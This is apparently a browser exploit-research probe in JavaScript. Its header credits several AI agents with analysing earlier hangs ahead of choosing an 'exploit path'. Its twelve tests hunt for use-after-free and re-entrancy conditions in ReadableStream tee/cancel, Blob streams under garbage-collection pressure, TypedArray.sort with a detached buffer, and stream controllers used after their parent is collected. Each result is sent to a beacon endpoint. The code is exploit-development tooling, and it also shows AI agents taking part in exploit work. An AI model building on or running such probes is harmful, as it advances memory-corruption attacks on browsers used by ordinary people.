// p122 — Discriminating probe: settle key questions from multi-agent debate
// DeepSeek + 3 Opus agents analyzed the two p121 hangs. Critical corrections:
//   HANG1: await cancel() is what hangs (spec behavior), NOT b1.read()
//   HANG2: normal backpressure (no reader), NOT negative-size rejection
// This probe re-baselines our understanding before committing to an exploit path.
(function(){
  var rid = 'v122d' + Math.random().toString(36).slice(2,15);
  function beacon(tag, data) {
    var body = typeof data === 'object' ? JSON.stringify(data) : String(data);
    try { navigator.sendBeacon('/beacon/V122D-' + tag, JSON.stringify({r:rid,b:body})); } catch(e){}
    try { fetch('/beacon/V122D-' + tag, {method:'POST',body:JSON.stringify({r:rid,b:body}),keepalive:true}).catch(function(){}); } catch(e2){}
  }
  beacon('L', 'probe122-start');

  function race(p, ms) {
    return Promise.race([
      p.then(function(v){ return {s:'ok',v:v}; }, function(e){ return {s:'err',e:e.constructor.name+':'+String(e.message||'').slice(0,80)}; }),
      new Promise(function(r){ setTimeout(function(){ r({s:'pending'}); }, ms || 800); })
    ]);
  }
  var sleep = function(ms){ return new Promise(function(r){ setTimeout(r, ms); }); };

  async function gcChurn(rounds) {
    for (var i = 0; i < (rounds || 20); i++) {
      var a = [];
      for (var j = 0; j < 10000; j++) a.push(new ArrayBuffer(4096));
      a = null;
      await sleep(10);
    }
  }

  function withTimeout(fn, ms) {
    return Promise.race([fn(), new Promise(function(_,rej){ setTimeout(function(){ rej(new Error('TIMEOUT_'+(ms||5000)+'ms')); }, ms || 5000); })]);
  }

  var tests = [];
  function addTest(n, fn) { tests.push({name:n, fn:fn}); }

  // D1: Attribute HANG 1 — is it cancel() or read() that hangs?
  addTest('D1-CANCEL-VS-READ', function(){
    return withTimeout(async function(){
      var pulls = 0;
      var rs = new ReadableStream({pull:function(c){ pulls++; c.enqueue(new Uint8Array(8)); }});
      var branches = rs.tee();
      var r1 = branches[0].getReader();
      for (var i = 0; i < 3; i++) await r1.read();
      r1.releaseLock();
      var cancelResult = await race(branches[0].cancel('test'), 500);
      var r2 = branches[1].getReader();
      var readResult = await race(r2.read(), 500);
      var readDone = 'na';
      if (readResult.s === 'ok' && readResult.v) readDone = readResult.v.done;
      return {cancel:cancelResult.s, read:readResult.s, readDone:readDone, pulls:pulls};
    }, 3000);
  });

  // D2: Can ctrl.close() release the stuck cancel promise?
  addTest('D2-CLOSE-SETTLES', function(){
    return withTimeout(async function(){
      var ctrl;
      var rs = new ReadableStream({start:function(c){ctrl=c;}, pull:function(){}});
      var branches = rs.tee();
      var cp = branches[0].cancel('test');
      var before = await race(cp, 200);
      ctrl.close();
      var after = await race(cp, 500);
      var rd = await race(branches[1].getReader().read(), 500);
      return {before:before.s, after:after.s, read:rd.s, readDone:rd.v?rd.v.done:'na'};
    }, 3000);
  });

  // D3: Both branches cancel → promise resolves
  addTest('D3-BOTH-CANCEL', function(){
    return withTimeout(async function(){
      var branches = new ReadableStream({pull:function(){}}).tee();
      var p1 = branches[0].cancel('a');
      var p2 = branches[1].cancel('b');
      return {p1:( await race(p1,500)).s, p2:(await race(p2,500)).s};
    }, 3000);
  });

  // D4: TransformStream negative size — undrained vs drained
  addTest('D4-TS-UNDRAINED', function(){
    return withTimeout(async function(){
      var calls = 0;
      var ts = new TransformStream(
        {transform:function(c,ctrl){ctrl.enqueue(c);}},
        undefined,
        {highWaterMark:1, size:function(){calls++; return calls===3 ? -999 : 1;}}
      );
      var w = ts.writable.getWriter();
      var steps = [];
      for (var i = 0; i < 3; i++) {
        steps.push({w:i, r:await race(w.write(new Uint8Array([i])), 600)});
      }
      return {calls:calls, steps:steps, ready:(await race(w.ready,100)).s};
    }, 5000);
  });

  addTest('D5-TS-DRAINED', function(){
    return withTimeout(async function(){
      var calls = 0;
      var ts = new TransformStream(
        {transform:function(c,ctrl){ctrl.enqueue(c);}},
        undefined,
        {highWaterMark:1, size:function(){calls++; return calls===3 ? -999 : 1;}}
      );
      var w = ts.writable.getWriter();
      var rd = ts.readable.getReader();
      var steps = [];
      for (var i = 0; i < 3; i++) {
        var wr = await race(w.write(new Uint8Array([i])), 600);
        var rr = await race(rd.read(), 600);
        steps.push({w:i, wr:wr.s, rr:rr.s, wErr:wr.e||'', rErr:rr.e||''});
      }
      return {calls:calls, steps:steps};
    }, 5000);
  });

  // D6: Queue.size overflow to Infinity — the REAL permanent stall
  addTest('D6-INFINITY-STALL', function(){
    return withTimeout(async function(){
      var ctrl;
      var rs = new ReadableStream(
        {start:function(c){ctrl=c;}},
        {highWaterMark:1, size:function(){return 1e308;}}
      );
      ctrl.enqueue('a');
      ctrl.enqueue('b');
      var desired0 = ctrl.desiredSize;
      var rd = rs.getReader();
      var r1 = await race(rd.read(), 500);
      var r2 = await race(rd.read(), 500);
      var r3 = await race(rd.read(), 500);
      var desired1 = ctrl.desiredSize;
      return {desired0:desired0, r1:r1.s, r2:r2.s, r3:r3.s, desired1:desired1};
    }, 5000);
  });

  // D7: GC liveness — does pending cancel promise root the tee graph?
  addTest('D7-GC-LIVENESS', function(){
    return withTimeout(async function(){
      var rs = new ReadableStream({pull:function(c){c.enqueue(new Uint8Array(8));}});
      var branches = rs.tee();
      var r = branches[0].getReader();
      await r.read();
      r.releaseLock();
      var p = branches[0].cancel('x');
      var wrs = new WeakRef(rs);
      var wb0 = new WeakRef(branches[0]);
      var wb1 = new WeakRef(branches[1]);
      var fin = [];
      try {
        var reg = new FinalizationRegistry(function(t){fin.push(t);});
        reg.register(rs, 'rs');
        reg.register(branches[0], 'b0');
        reg.register(branches[1], 'b1');
      } catch(e){}
      rs = null; branches = null; r = null;
      var cancelState = await race(p, 50);
      await gcChurn(25);
      await sleep(200);
      return {
        cancel:cancelState.s,
        parentAlive:!!wrs.deref(),
        b0Alive:!!wb0.deref(),
        b1Alive:!!wb1.deref(),
        finalized:fin.join(',')
      };
    }, 15000);
  });

  // D8: Blob.stream() fingerprint — is it a byte stream?
  addTest('D8-BLOB-STREAM', function(){
    return withTimeout(async function(){
      var r = {};
      try {
        var blob = new Blob([new Uint8Array(1024).fill(0xBB)]);
        var s = blob.stream();
        r.streamType = Object.prototype.toString.call(s);
        r.locked = s.locked;
        // Check for BYOB reader support
        try {
          var byob = s.getReader({mode:'byob'});
          r.byobReader = 'SUPPORTED';
          byob.releaseLock();
        } catch(e) {
          r.byobReader = e.constructor.name + ':' + String(e.message||'').slice(0,60);
        }
        // Check controller type
        var rd = s.getReader();
        var chunk = await race(rd.read(), 1000);
        r.read = chunk.s;
        if (chunk.v) {
          r.chunkType = Object.prototype.toString.call(chunk.v.value);
          r.chunkLen = chunk.v.value ? chunk.v.value.length || chunk.v.value.byteLength : 0;
        }
        rd.releaseLock();
      } catch(e) {
        r.err = e.constructor.name + ':' + String(e.message||'').slice(0,80);
      }
      // Check if ReadableByteStreamController exists
      r.RBSC = typeof ReadableByteStreamController;
      r.BYOBReader = typeof ReadableStreamBYOBReader;
      return r;
    }, 5000);
  });

  // D9: Native-source + tee + GC (bug 303460 shape)
  addTest('D9-NATIVE-TEE-GC', function(){
    return withTimeout(async function(){
      var r = {};
      try {
        var blob = new Blob([new Uint8Array(1 << 18).fill(0xDD)]);
        var s = blob.stream();
        var branches = s.tee();
        var rd = branches[1].getReader();
        var p = rd.read();
        var ws = new WeakRef(s);
        var canary = new Uint32Array(256);
        for (var i = 0; i < canary.length; i++) canary[i] = (0xC0DE0000 + i) >>> 0;
        s = null; rd = null;
        var before = await race(p, 100);
        r.beforeRead = before.s;
        await gcChurn(20);
        await sleep(200);
        r.streamAlive = !!ws.deref();
        r.canaryOK = true;
        for (var i = 0; i < canary.length; i++) {
          if (canary[i] !== ((0xC0DE0000 + i) >>> 0)) { r.canaryOK = false; r.canaryIdx = i; break; }
        }
        var after = await race(p, 1000);
        r.afterRead = after.s;
        if (after.v && after.v.value) r.afterLen = after.v.value.byteLength || after.v.value.length;
      } catch(e) {
        r.err = e.constructor.name + ':' + String(e.message||'').slice(0,80);
      }
      return r;
    }, 15000);
  });

  // D10: TypedArray.sort with comparator that detaches buffer
  addTest('D10-SORT-DETACH', function(){
    return withTimeout(async function(){
      var r = {};
      try {
        var ab = new ArrayBuffer(256);
        var ta = new Uint8Array(ab);
        for (var i = 0; i < 256; i++) ta[i] = 255 - i;
        var comparisons = 0;
        var detached = false;
        try {
          ta.sort(function(a, b) {
            comparisons++;
            if (comparisons === 20 && !detached) {
              try {
                var mc = new MessageChannel();
                mc.port1.postMessage('x', [ab]);
                detached = true;
                r.detachAt = comparisons;
                r.abLen = ab.byteLength;
              } catch(e) { r.detachErr = e.constructor.name; }
            }
            return a - b;
          });
          r.sortOK = true;
        } catch(e) {
          r.sortErr = e.constructor.name + ':' + String(e.message||'').slice(0,60);
        }
        r.comparisons = comparisons;
        r.detached = detached;
        r.finalAbLen = ab.byteLength;
        // Check if sort wrote past detach
        if (detached && ab.byteLength === 0) {
          r.UAF = 'BUFFER_DETACHED_SORT_CONTINUED';
          r.postDetachComparisons = comparisons - 20;
        }
      } catch(e) {
        r.err = e.constructor.name + ':' + String(e.message||'').slice(0,80);
      }
      return r;
    }, 5000);
  });

  // D11: Re-entrancy via Array.prototype[Symbol.iterator] during stream ops
  addTest('D11-REENTRY', function(){
    return withTimeout(async function(){
      var r = {};
      var iterCalls = [];
      var origIter = Array.prototype[Symbol.iterator];
      try {
        Array.prototype[Symbol.iterator] = function() {
          iterCalls.push(new Error().stack ? new Error().stack.split('\n')[2]||'?' : '?');
          return origIter.call(this);
        };
        // TransformStream construction iterates an internal array
        try {
          var ts = new TransformStream();
          r.tsCreated = true;
        } catch(e) {
          r.tsErr = e.constructor.name + ':' + String(e.message||'').slice(0,60);
        }
        r.iterCallsDuringTS = iterCalls.length;
        iterCalls = [];
        // ReadableStream.tee() might also use iterators
        try {
          var rs = new ReadableStream({start:function(c){c.close();}});
          var t = rs.tee();
          r.teeIterCalls = iterCalls.length;
        } catch(e) {}
      } catch(e) {
        r.err = e.constructor.name;
      } finally {
        Array.prototype[Symbol.iterator] = origIter;
      }
      r.totalHits = iterCalls.length;
      return r;
    }, 3000);
  });

  // D12: WeakRef + forced resolution — can we trigger UAF?
  addTest('D12-WEAKREF-RESOLVE', function(){
    return withTimeout(async function(){
      var r = {};
      var ctrl;
      var rs = new ReadableStream({start:function(c){ctrl=c;}, pull:function(){return new Promise(function(){});}});
      var branches = rs.tee();
      // Read from b0, then cancel b0
      var r0 = branches[0].getReader();
      await r0.read().catch(function(){});
      r0.releaseLock();
      var cancelP = branches[0].cancel('x');
      // Keep ctrl and b1, drop everything else
      var weakRS = new WeakRef(rs);
      rs = null; branches = null; r0 = null;
      // GC pressure
      await gcChurn(15);
      await sleep(100);
      r.parentCollected = !weakRS.deref();
      if (r.parentCollected) {
        // Parent was collected! Try to use ctrl to push data
        try {
          ctrl.enqueue(new Uint8Array(64).fill(0xAA));
          r.enqueueAfterGC = 'OK';
        } catch(e) {
          r.enqueueAfterGC = e.constructor.name + ':' + String(e.message||'').slice(0,60);
        }
        try {
          ctrl.close();
          r.closeAfterGC = 'OK';
        } catch(e) {
          r.closeAfterGC = e.constructor.name + ':' + String(e.message||'').slice(0,60);
        }
      } else {
        r.parentCollected = false;
        // Parent alive — try normal resolution
        try {
          ctrl.close();
          var cancelResult = await race(cancelP, 500);
          r.cancelAfterClose = cancelResult.s;
        } catch(e) {
          r.closeErr = e.constructor.name;
        }
      }
      return r;
    }, 15000);
  });

  async function runAll() {
    for (var i = 0; i < tests.length; i++) {
      var t = tests[i];
      try {
        var result = await t.fn();
        beacon(t.name, result);
      } catch(e) {
        beacon(t.name, {error:e.constructor.name+':'+String(e.message||'').slice(0,200)});
      }
    }
    beacon('Z', 'probe122-done');
  }
  runAll();
})();
